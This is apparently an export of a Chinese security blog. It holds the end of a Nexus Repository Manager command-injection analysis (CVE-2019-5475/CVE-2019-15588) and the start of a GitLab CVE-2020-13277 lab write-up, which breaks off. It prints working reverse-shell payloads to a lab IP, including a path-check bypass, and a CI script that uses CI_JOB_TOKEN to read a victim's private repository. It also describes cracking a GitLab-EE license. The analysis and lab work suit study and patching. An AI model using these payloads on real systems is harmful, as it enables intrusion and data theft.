<code>"</code></td></tr></tbody></table><p>拆解后的命令字符串数组会被存储到 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L101"><code>CommandLine.java</code></a> 对象内，其中第 0 个子串作为命令脚本，后续所有子串作为该脚本的参数。</p><p>跟踪 <a href="https://github.com/sonatype/nexus-public/blob/2ba4210946b81167a8b02e9e8f132e054df190c3/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/task/CommandLineExecutor.java#L68"><code>DefaultExecutor.execute()</code></a> 发现，<a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L101"><code>CommandLine.java</code></a> 最终在 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/launcher/Java13CommandLauncher.java#L60"><code>Java13CommandLauncher.exec()</code></a> 通过 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L296"><code>toStrings()</code></a> 被展开执行：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Process <span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">final</span> CommandLine cmd<span class="token punctuation">,</span> <span class="token keyword">final</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env<span class="token punctuation">,</span> <span class="token keyword">final</span> File workingDir<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> envVars <span class="token operator">=</span> EnvironmentUtils<span class="token punctuation">.</span><span class="token function">toStrings</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">toStrings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> envVars<span class="token punctuation">,</span> workingDir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>显然，真正执行命令的主体就是 <a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/master/src/share/classes/java/lang/Runtime.java"><code>Runtime.getRuntime().exec()</code></a>，需要注意，<code>Runtime</code> 的 <code>exec()</code> 方法重载了两种类型的参数，其使用方式是完全不同的（可参考<a href="https://blog.csdn.net/timo1160139211/article/details/75006938">这篇文章</a>）：</p><ul><li><a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/java/lang/Runtime.java#L439"><code>Runtime.getRuntime().exec(String command)</code></a>： 不支持重定向符 <code>&lt;</code>、<code>&gt;</code> 和管道符 <code>|</code></li><li><a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/java/lang/Runtime.java#L613"><code>Runtime.getRuntime().exec(String cmdarray[])</code></a>： 支持复杂命令， Nexus 实际调用的方法</li></ul><p>回看前面我们构造的 payload： <code>bash -c bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || python</code>。</p><p>实际上它被拆解为 String[] { <code>bash</code>、<code>-c</code>、<code>bash</code>、<code>-i</code>、<code>&gt;&amp;/dev/tcp/172.168.50.2/4444</code>、<code>0&gt;&amp;1</code>、<code>||</code>、<code>python</code> }，切割出来的后面所有字符串都作为了 <code>bash</code> 的参数，当然无法执行成功了。</p><p><img src="./05.png"></p><p>我们真正期望的 payload 应该是把 <code>bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1</code> 整体作为 <code>bash -c</code> 的参数字符串。那么直接构造这样的 payload 又是否可行呢： <code>bash -c "bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1" || python</code> ？</p><p>很遗憾也是不可行的，前面分析 Nexus 代码的时候，提到了一个函数 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L336"><code>translateCommandline()</code></a>，它会把这种形式的命令拆解成：</p><p>String[] { <code>bash</code>、<code>-c</code>、<code>"bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1"</code>、<code>||</code>、<code>python</code> }</p><p>而我们期望应该拆解为（留意看第 2 个参数，作为整体字符串的同时两侧不能有双引号）：</p><p>String[] { <code>bash</code>、<code>-c</code>、<code>bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1</code>、<code>||</code>、<code>python</code> }</p><p><img src="./06.png"></p><p>那么现在的问题就是要想办法绕过 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L336"><code>translateCommandline()</code></a> 对 <code>bash -c cmd_string</code> 的影响。有两种绕过选择：</p><ul><li>（1）允许 <code>cmd_string</code> 被按空格完全拆解，但是在 Linux 层面依然可以正常执行</li><li>（2）使得 <code>cmd_string</code> 成为一个整体被携带到 <a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/java/lang/Runtime.java#L613"><code>Runtime.getRuntime().exec(String cmdarray[])</code></a> 又不会在其两端附加双引号</li></ul><p>苦思无果，最后参考《<a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">绕过exec获取反弹shell</a>》这篇文章得到答案，这两个思路其实都能做。</p><h3 id="0x61-利用-Linux-语法特性"><a href="#0x61-利用-Linux-语法特性" class="headerlink" title="0x61 利用 Linux 语法特性"></a>0x61 利用 Linux 语法特性</h3><blockquote><p>允许 <code>cmd_string</code> 被按空格完全拆解，但是在 Linux 层面依然可以正常执行</p></blockquote><p>这里要利用 Linux 中三种语法特性：</p><ul><li><code>echo</code> 会以文本形式无条件打印其后所有参数（不管参数间是否有空格）</li><li>在 shell 脚本中，特殊变量 <code>$@</code>（或 <code>$*</code>） 可以获得除了 <code>$0</code>（脚本路径）之外的所有脚本参数（即 <code>$1</code> … <code>$n</code>）</li><li>管道命令 <code>|</code> 可以把前一个命令的输出作为后一个命令的输入</li></ul><p>结合三者可以构筑一条像这样的命令：<code>bash -c $@|bash any_script_path echo cmd_string</code></p><p>不妨分析一下这条命令的含义：</p><ul><li>经过前面分析，<code>bash -c $@|bash</code> 相信大家都很熟悉了，就是在 <code>bash</code> 环境执行命令 <code>$@|bash</code>，但是这个命令有点特殊，是 <code>$@</code>，即取脚本参数。</li><li>此时 shell 就会解析后面的 <code>any_script_path echo cmd_string</code>，由于 <code>$@</code> 只取脚本参数，于是脚本路径 <code>any_script_path</code> 就会被忽略，只取 <code>echo cmd_string</code>。</li><li>于是 <code>$@|bash</code> 就被解析为 <code>echo cmd_string|bash</code>，此时就变成了一条管道命令： <code>echo</code> 以文本形式输出了 <code>cmd_string</code>，然后作为 <code>bash</code> 的入参被执行了（可以理解为 <code>echo</code> 输出了一条命令 <code>cmd_string</code> 到一个临时的脚本文件，然后用 <code>bash</code> 执行了该脚本文件）</li></ul><p>回到这次漏洞，只要令 <code>any_script_path</code> 为任意值（如 <code>0</code>），<code>cmd_string</code> 为 <code>bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || python</code>，我们就可以得到 payload ：<code>bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || python</code></p><p>虽然它被按空格完全拆解，但是利用上述的 Linux 语法特性，是可以成功执行 <code>bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1</code> 实现反弹 shell 的。</p><p><img src="./03.png"></p><h3 id="0x62-利用-Base64-编码"><a href="#0x62-利用-Base64-编码" class="headerlink" title="0x62 利用 Base64 编码"></a>0x62 利用 Base64 编码</h3><blockquote><p>使得 <code>cmd_string</code> 成为一个整体被携带到 <a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/java/lang/Runtime.java#L613"><code>Runtime.getRuntime().exec(String cmdarray[])</code></a> 又不会在其两端附加双引号</p></blockquote><p>是的，借用 Base64 编码就可以很巧妙地达到此目的，即令 <code>cmd_string</code> 为 <code>Base64.encode(bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1)</code>，我们就可以构造这样的 payload ：<code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUwLjIvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i} || python</code></p><p>但这条 payload 只是理论上可行，因为它只能绕过 java 后端逻辑，无法绕过 nexus 前端校验，因此无法使用。</p><p><img src="./07.png"></p><h2 id="0x70-漏洞修复（不完整）"><a href="#0x70-漏洞修复（不完整）" class="headerlink" title="0x70 漏洞修复（不完整）"></a>0x70 漏洞修复（不完整）</h2><p>上述即为漏洞 CVE-2019-5475 原理，官方针对其发布了第一次<a href="https://github.com/sonatype/nexus-public/commit/e8769e53f6bb601126ef5d21f9ea009873b65e25#diff-4ab0523de106ac7a38808f0231fc8a23R81">修复补丁</a>。</p><p>改动的内容不多，核心改动的只有两个位置：</p><ul><li><a href="https://github.com/sonatype/nexus-public/blob/7b9939e71693422d3e09adc3744fa2e9b3a62a63/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121"><code>CommandLineExecutor.exe()</code></a>： 入参增加一个参数，不再直接拼接 GUI 的 <code>${INPUT}</code> 和 <code> --version</code></li><li><a href="https://github.com/sonatype/nexus-public/blob/7b9939e71693422d3e09adc3744fa2e9b3a62a63/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/task/CommandLineExecutor.java#L102"><code>CommandLineExecutor.getCleanCommand()</code></a>： 增加的命令清洗方法，用于校验 <code>${INPUT}</code> 是否合法</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> String <span class="token function">getCleanCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">,</span> String params<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allowedExecutables<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> command <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> params<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>applicationDirectories<span class="token punctuation">.</span><span class="token function">getWorkDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      LOG<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Attempt to execute command with illegal path {}"</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExecutables<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      LOG<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Attempt to execute illegal command {}"</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> params<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来解读一下这个方法：</p><ul><li>在前端 GUI 输入框 <code>Path of "createrepo"</code> 输入的 <code>${INPUT}</code> 会作为入参 <code>command</code> 的值，而入参 <code>params</code> 的固定值就是 <code> --version</code></li><li>从上下文代码来看 <code>allowedExecutables</code> 是一个 Hash 表，其中只有两个元素： <code>createrepo</code> 和 <code>mergerepo</code></li><li><code>applicationDirectories.getWorkDirectory().getAbsolutePath()</code> 就是 Nexus 项目路径，可以认为是固定值 <code>/sonatype-work</code></li></ul><p>那么其逻辑就很清晰了：</p><ul><li>(1) 先判断 <code>${INPUT}</code> 是否为 <code>createrepo</code> 或 <code>mergerepo</code> 之一，若是则无需校验直接返回</li><li>(2) 然后通过 <code>new File(command)</code> 取得我们输入的命令脚本文件对象，目的应该是为了确保输入的 <code>${INPUT}</code> 只能是有效的脚本文件路径</li><li>(3) 继而通过 <code>file.getAbsolutePath()</code> 检查这个脚本文件的路径是否在 Nexus 的工作目录内，目的应该是避免 webshell</li><li>(4) 最后通过 <code>file.getName()</code> 检查脚本的文件名是否为 <code>createrepo</code> 或 <code>mergerepo</code> 之一</li></ul><p>综上来看，这段代码就是试图确保我们输入的命令脚本，必须是 <code>createrepo</code> 或 <code>mergerepo</code>，但是这两个脚本可以放在除了 <code>/sonatype-work</code> 目录外的任意路径。</p><h2 id="0x80-漏洞二次利用"><a href="#0x80-漏洞二次利用" class="headerlink" title="0x80 漏洞二次利用"></a>0x80 漏洞二次利用</h2><p>现在目标很明确了，我们构造的 <code>${INPUT}</code> 必须是合法的文件路径，即满足（2），同时要绕过（1）（3）（4）。</p><p>先前的 payload： <code>bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || python</code> 是没办法绕过这几层校验的，但是我们只需要对它进行改造即可。</p><p>首先要使其可以被 <code>new File()</code> 识别，就要让它【看起来】是一个文件路径（不需要文件真正存在）。须知道 <code>new File()</code> 是允许路径中有空格的，而且 Linux 也允许文件名中有空格和特殊字符，那么就很好办了：在其开头加上 <code>/bin/</code>、其末尾修改为 <code>/createrepo</code>。</p><p>于是 payload 就变成： <code>/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || /createrepo</code>。 它会被 <code>new File()</code> 解读为：</p><ul><li>一级目录： <code>/</code></li><li>二级目录： <code>bin/</code></li><li>三级目录： <code>bash -c $@|bash 0 echo bash -i &gt;&amp;/</code></li><li>四级目录： <code>dev/</code></li><li>五级目录： <code>tcp/</code></li><li>六级目录： <code>172.168.50.2/4444 0&gt;&amp;1 || /</code></li><li>文件名： <code>createrepo</code></li></ul><p>此时 <code>file.getAbsolutePath()</code> 得到的就是 <code>/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || /createrepo</code>，已经可以绕过（1）（2）（3）了。而 <code>file.getName()</code> 得到的是 <code>createrepo</code>，可以绕过（4）。</p><p>所以最终可以成功反弹 shell 的 payload 为： <code>/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || /createrepo</code></p><p><img src="./08.png"></p><h2 id="0x90-漏洞修复"><a href="#0x90-漏洞修复" class="headerlink" title="0x90 漏洞修复"></a>0x90 漏洞修复</h2><p>上述即为漏洞 CVE-2019-15588 原理，官方针对其发布了第二次<a href="https://github.com/sonatype/nexus-public/commit/3dd1d59393149833150b702ddf6485b5ef3312bd#diff-4ab0523de106ac7a38808f0231fc8a23R111">修复补丁</a>。</p><p>这次修改改动不多，主要针对 <a href="https://github.com/sonatype/nexus-public/blob/489b60472df89ad90eac84cc46995a54dfe2fb1b/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/task/CommandLineExecutor.java#L111"><code>CommandLineExecutor.getCleanCommand()</code></a> 方法添加了 <code>file.exists()</code> 判断，即要求我们 <code>${INPUT}</code> 输入的脚本文件路径必须是真正存在的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    LOG<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Attempt to execute command that doesn't exist {}"</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>至此这个注入点才算是真正被修复，不再轻易被绕过。</p><h2 id="0xA0-参考资料"><a href="#0xA0-参考资料" class="headerlink" title="0xA0 参考资料"></a>0xA0 参考资料</h2><ul><li>《<a href="https://paper.seebug.org/1260/">Nexus Repository Manager 2.x 命令注入漏洞 (CVE-2019-5475) 两次绕过</a>》</li><li>《<a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">绕过exec获取反弹shell</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-13277 漏洞分析</title>
      <link href="/safe/cve-2020-13277-lou-dong-fen-xi/"/>
      <url>/safe/cve-2020-13277-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x10-漏洞背景"><a href="#0x10-漏洞背景" class="headerlink" title="0x10 漏洞背景"></a>0x10 漏洞背景</h2><p>GitLab 是美国 GitLab 公司的一款使用 Ruby on Rails 开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug 列表等。</p><p>于 2020-06-09，Kenshou Uemura 在 <a href="https://hackerone.com/reports/894569">hackerone</a> 披露 GitLab 的 CE（社区版）和 EE（企业版） <code>10.6 - 13.0.5</code> 版本中的 <a href="https://docs.gitlab.com/ee/user/project/repository/repository_mirroring.html">Mirror Repository</a> 逻辑存在安全漏洞，攻击者可利用该漏洞在受害者不知情的状况下使用其 <code>CI_JOB_TOKEN</code> 读取其私有仓库。</p><hr><h2 id="0x20-漏洞靶场"><a href="#0x20-漏洞靶场" class="headerlink" title="0x20 漏洞靶场"></a>0x20 漏洞靶场</h2><ul><li>靶场源码： <a href="https://github.com/lyy289065406/CVE-2020-13277">https://github.com/lyy289065406/CVE-2020-13277</a></li><li>环境说明：<ul><li>Docker: <code>latest</code></li><li>Gitlab-EE: <code>10.6.0</code></li><li>Runner: <code>latest</code></li></ul></li><li>靶场结构：</li></ul><pre><code>CVE-2020-13277├── gitlab .................. [Gitlab 容器的挂载目录]│   ├── Dockerfile .......... [Gitlab 的 Docker 构建文件]│   ├── config .............. [Gitlab 配置挂载目录]│   ├── data ................ [Gitlab 数据挂载目录]│   ├── logs ................ [Gitlab 日志挂载目录]│   ├── keys ................ [Gitlab 破解 License 存储目录]│   └── runner .............. [Runner 容器的挂载目录]├── license ................. [破解 License 的容器构建目录]│   ├── Dockerfile .......... [License 的 Docker 构建文件]│   └── license.rb .......... [生成破解 License 的 Ruby 脚本]├── docker-compose.yml ...... [Docker 的构建配置]├── keygen.ps1 .............. [Windows: 一键生成破解 License]├── keygen.sh ............... [Linux:   一键生成破解 License]├── run.ps1 ................. [Windows: 一键运行 Gitlab 靶场]├── run.sh .................. [Linux:   一键运行 Gitlab 靶场]├── register.ps1 ............ [Windows: 一键注册 Runner]├── register.sh ............. [Linux:   一键注册 Runner]├── stop.ps1 ................ [Windows: 一键停止 Gitlab 靶场]└── stop.sh ................. [Linux:   一键停止 Gitlab 靶场]</code></pre><details><summary><b>关于靶场 Docker Image 版本的选择依据</b></summary><br><p>此漏洞核心主要是利用 <a href="https://docs.gitlab.com/ee/user/project/repository/repository_mirroring.html">Mirror Repository</a> - 仓库的镜像同步备份功能。</p><p>其中 Mirror 的同步方向又分两种：</p><ul><li>Pull：把指定 Repository 内容拉到当前 Repository</li><li>Push：把当前 Repository 内容推到指定 Repository</li></ul><blockquote><p>此漏洞利用的是 Pull 方向的 Mirror Repository</p></blockquote><p>要知道，Gitlab 分为 CE（社区免费版）和 EE（企业收费版）两种版本，而 Gitlab <a href="https://gitlab.com/gitlab-org/cves/-/blob/master/2020/CVE-2020-13277.json">官方也声称</a> 此漏洞会同时影响 CE 和 EE 的以下版本：</p><ul><li><code>&gt;=10.6, &lt;12.9.10</code></li><li><code>&gt;=12.10, &lt;12.10.11</code></li><li><code>&gt;=13.0, &lt;13.0.6</code></li></ul><p>但并不意味着这些版本的 <a href="https://hub.docker.com/search?q=gitlab">Gitlab Docker Image</a> 都可以用于搭建靶场，这是因为：</p><ul><li>CE 版的 Mirror Repository 只有 Push 方向</li><li>EE 版又细分为 Core、Starter、Premium、Ultimate 四个版本，从官方提供的<a href="https://about.gitlab.com/pricing/self-managed/feature-comparison/">功能对比表</a>可知：只有 Core 版本是不存在 Pull 方向的，而 Gitlab-EE 的 Docker Image 均只提供是 Core 版本</li></ul><p>换而言之，要使用 Docker 搭建靶场，只能选用 Gitlab-EE 版，并将其<a href="https://blog.starudream.cn/2020/01/19/6-crack-gitlab/">破解</a>（壕也可以选择购买 License）以激活 Mirror Repository - Pull 功能。</p><p>但即使破解了 Gitlab-EE，无论 <code>10.x</code>、 <code>12.x</code> 还是 <code>13.x</code>，当 Mirror Repository - Pull 的 URL 包含本地路径时，都会报错 <code>Import url is blocked: Requests to localhost are not allowed</code>。</p><p>虽然通过 <code>Admin area =&gt; Settings =&gt; Network =&gt; Outbound requests</code> 设置 <code>Allow requests to the local network from hooks and services</code> 后可以配置本地 URL ，但同步镜像时会报错 <code>2:Fetching remote upstream failed: fatal: unable to access http://127.0.0.1/xxxx/: The requested URL returned error: 301</code>。换言之只有 Pull Remote Repository 可用。</p><p>不过幸好，尽管 <code>12.x</code> 和 <code>13.x</code> 对本地 URL 的判断方法十分严格，但是在 <code>10.x</code> 版本却有应对之法： 在配置 Pull URL 的时候，只需要配置本地设置的 DNS 服务名称即可实现绕过。</p><p>综上可知，最终只能采用 <a href="https://hub.docker.com/layers/gitlab/gitlab-ee/10.6.0-ee.0/images/sha256-1895df14d31443c8642a2564cdc3fad6948a89df09e616376b10d1b1971a75f8?context=explore">gitlab-ee:10.6.0-ee.0</a> 版本的 Docker Image 构建此靶场。</p><blockquote><p>其实通过前面描述也可知道此漏洞的利用条件比较苛刻，基本上穷人是很难被这个漏洞影响的</p></blockquote></details><hr><h2 id="0x30-靶场搭建"><a href="#0x30-靶场搭建" class="headerlink" title="0x30 靶场搭建"></a>0x30 靶场搭建</h2><h3 id="0x31-构建"><a href="#0x31-构建" class="headerlink" title="0x31 构建"></a>0x31 构建</h3><ul><li>宿主机预装 docker 和 docker-compose</li><li>下载本仓库： <a href="https://github.com/lyy289065406/CVE-2020-13277">git clone https://github.com/lyy289065406/CVE-2020-13277</a></li><li>生成破解密钥对： <code>./keygen.sh/ps1</code></li><li>构建并运行 Gitlab （确保 80 端口未占用）： <code>./run.sh/ps1</code></li><li>约 5 分钟后可从浏览器登录 Gitlab：<a href="http://127.0.0.1/">http://127.0.0.1</a> （首次登录需要重设管理员账号 root 的密码）</li></ul><h3 id="0x32-破解"><a href="#0x32-破解" class="headerlink" title="0x32 破解"></a>0x32 破解</h3><p>前面生成破解密钥对的时候，已经把公钥写入 Gitlab 容器后台了，还需要把私钥通过前端上传到 Gitlab 完成破解：</p><ul><li>密钥对生成到 <code>./gitlab/keys/</code> 目录，复制其下 <code>.gitlab-license</code> 的内容（私钥）</li><li>使用 root 用户打开 <a href="http://127.0.0.1/admin/license/new">http://127.0.0.1/admin/license/new</a> 页面</li><li>选择 <code>Enter license key</code> 并粘贴私钥，点击 <code>Upload license</code> 按钮即可完成破解</li></ul><blockquote><p>至此 Mirror Repository - Pull 功能已激活</p></blockquote><p><img src="01.png"></p><h3 id="0x33-出站设置"><a href="#0x33-出站设置" class="headerlink" title="0x33 出站设置"></a>0x33 出站设置</h3><ul><li>使用 root 用户打开 <a href="http://127.0.0.1/admin/application_settings">http://127.0.0.1/admin/application_settings</a> 页面</li><li>找到最底部的 <code>Outbound requests</code> 并勾选 <code>Allow requests to the local network from hooks and services</code> 保存</li></ul><blockquote><p>至此 Mirror Repository - Pull 已支持拉取本地 Repository</p></blockquote><p><img src="02.png"></p><h3 id="0x34-设置-Runner"><a href="#0x34-设置-Runner" class="headerlink" title="0x34 设置 Runner"></a>0x34 设置 Runner</h3><ul><li>使用 root 用户打开 <a href="http://127.0.0.1/admin/runners">http://127.0.0.1/admin/runners</a> 页面</li><li>找到 registration token 并复制</li><li>注册 Runner： <code>./register.sh/ps1 $TOKEN</code></li></ul><blockquote><p>至此所有 Repository 都可以使用此 Runner 执行 CI 脚本（Pipeline Jobs）</p></blockquote><p><img src="03.png"></p><hr><h2 id="0x40-漏洞分析"><a href="#0x40-漏洞分析" class="headerlink" title="0x40 漏洞分析"></a>0x40 漏洞分析</h2><p>漏洞分析过程亦是靶场验证过程，可参考官方的 <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/220972">Issue</a> 步骤，但下面的分析过程会配合此靶场对某些步骤进行微调</p><h3 id="0x41-预建验证用账号"><a href="#0x41-预建验证用账号" class="headerlink" title="0x41 预建验证用账号"></a>0x41 预建验证用账号</h3><p>使用 root 用户打开 <a href="http://127.0.0.1/admin/users">http://127.0.0.1/admin/users</a> 页面创建 3 个账号：</p><ul><li><code>victim</code>： 受害者账号</li><li><code>attacker1</code>： 攻击者账号1</li><li><code>attacker2</code>： 攻击者账号2</li></ul><blockquote><p>创建账号时不能设置初始密码，Gitlab 默认会推送初始密码到所设置的 Email。为方便起见，其实可以随便填 Email，先创建账号，然后再马上编辑该账号，此时即可用 root 设置该账号的初始密码，而不需要通过 Email</p></blockquote><p><img src="04.png"></p><h3 id="0x42-预建受害者仓库"><a href="#0x42-预建受害者仓库" class="headerlink" title="0x42 预建受害者仓库"></a>0x42 预建受害者仓库</h3><ul><li>使用 <code>victim</code> 账号登录 Gitlab</li><li>新建仓库 <code>New Project</code>：<ul><li>Name： <code>target</code></li><li>Visibility Level： <code>Private</code></li></ul></li><li>在仓库内新建 <code>README.md</code> 文件，随意设置其内容为 <code>mykey is abcxyz</code></li></ul><blockquote><p>明显 <code>target</code> 为 <code>victim</code> 的私有仓库，而我们的目标就是利用漏洞获取此仓库的内容</p></blockquote><p><img src="05.png"></p><h3 id="0x43-创建攻击者的-poc-仓库"><a href="#0x43-创建攻击者的-poc-仓库" class="headerlink" title="0x43 创建攻击者的 poc 仓库"></a>0x43 创建攻击者的 poc 仓库</h3><ul><li>使用 <code>attacker1</code> 账号登录 Gitlab</li><li>新建仓库 <code>New Project</code>：<ul><li>Name： <code>poc</code></li><li>Visibility Level： <code>Public</code></li></ul></li><li>在仓库内新建 <code>.gitlab-ci.yml</code> 文件，其内容为：</li></ul><pre><code>image: "ruby:2.6"rspec:    script:      - git clone http://gitlab-ci-token:$CI_JOB_TOKEN@172.168.30.2/victim/target.git    - cd target    - ls -lah .      - cat README.md</code></pre><p>【目的】在接下来的操作中，会通过一些手法使得 <code>victim</code> 在<strong>不知情</strong>的状况下，使用其权限执行这个 CI 脚本。</p><blockquote><p>因为当前靶场未设置证书，所以只能使用 <code>http</code> 协议；另外 <code>172.168.30.2</code> 是 <code>docker-compose.yml</code> 为 Gitlab 容器分配的 IP，因为此 CI 脚本最终是会通过 Runner 执行，而当前靶场的 Runner 和 Gitlab 并不是同一个容器，因此要使用 Docker 所分配的 IP 地址</p></blockquote><p><img src="06.png"></p><h3 